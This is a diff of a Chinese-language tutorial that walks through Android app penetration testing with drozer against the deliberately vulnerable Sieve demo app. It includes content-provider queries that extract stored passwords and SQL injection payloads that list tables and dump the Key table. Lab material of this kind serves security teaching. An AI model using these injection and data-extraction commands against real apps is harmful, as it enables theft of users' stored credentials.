@@ -12,38 +12,38 @@
 　　drozer console connect  
 　　二、测试步骤  
 　　1.获取包名  
-　　dz> run app.package.list -f sieve
-　　com.mwr.example.sieve
-　　2.获取应用的基本信息
-　　run app.package.info -a com.mwr.example.sieve
-　　3.确定攻击面
-　　run app.package.attacksurface com.mwr.example.sieve
-　　4.Activity
-　　（1）获取activity信息
-　　run app.activity.info -a com.mwr.example.sieve
-　　（2）启动activity
-　　run app.activity.start --component com.mwr.example.sieve
-　　dz> help app.activity.start
-　　usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]
-　　[--component PACKAGE COMPONENT] [--data-uri DATA_URI]
-　　[--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]
-　　[--mimetype MIMETYPE]
-　　5.Content Provider  
-　　（1）获取Content Provider信息   
+　　dz> run app.package.list -f sieve   
+　　com.mwr.example.sieve   
+　　2.获取应用的基本信息   
+　　run app.package.info -a com.mwr.example.sieve   
+　　3.确定攻击面   
+　　run app.package.attacksurface com.mwr.example.sieve   
+　　4.Activity   
+　　（1）获取activity信息   
+　　run app.activity.info -a com.mwr.example.sieve   
+　　（2）启动activity   
+　　run app.activity.start --component com.mwr.example.sieve   
+　　dz> help app.activity.start   
+　　usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]   
+　　[--component PACKAGE COMPONENT] [--data-uri DATA_URI]   
+　　[--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]   
+　　[--mimetype MIMETYPE]   
+　　5.Content Provider    
+　　（1）获取Content Provider信息    
 　　run app.provider.info -a com.mwr.example.sieve   
 　　（2）Content Providers（数据泄露） 
-　　先获取所有可以访问的Uri：
+　　先获取所有可以访问的Uri：   
 　　run scanner.provider.finduris -a com.mwr.example.sieve   
-　　获取各个Uri的数据：
-　　run app.provider.query   
-　　content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
-　　查询到数据说明存在漏洞
-　　（3）Content Providers（SQL注入）
-　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" `  
-　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"  ` 
-　　报错则说明存在SQL注入。
-　　列出所有表：
-　　run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"  
+　　获取各个Uri的数据：   
+　　run app.provider.query    
+　　content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical   
+　　查询到数据说明存在漏洞   
+　　（3）Content Providers（SQL注入）    
+　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" `   
+　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"  `  
+　　报错则说明存在SQL注入。   
+　　列出所有表：   
+　　run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"    
 　　获取某个表（如Key）中的数据：  
 　　run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"  
 　　（4）同时检测SQL注入和目录遍历  
